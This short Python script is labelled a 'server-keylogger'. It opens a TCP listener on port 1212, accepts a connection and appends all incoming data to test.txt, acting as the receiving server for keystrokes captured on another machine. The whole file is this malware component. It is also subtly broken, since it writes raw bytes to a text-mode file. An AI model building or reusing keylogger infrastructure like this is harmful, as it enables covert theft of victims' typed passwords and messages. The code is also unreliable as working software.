"""server-keylogger"""
import socket

ip = ''
port = 1212

s = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ip, port))
s.listen()
clinetsocket, (cip, cport) = s.accept()

print("connection", cip, "and", cport)

while True:
    data = clinetsocket.recv(1024)
    f = open("test.txt", "a")
    f.write(data)
    f.close()
    
    
    
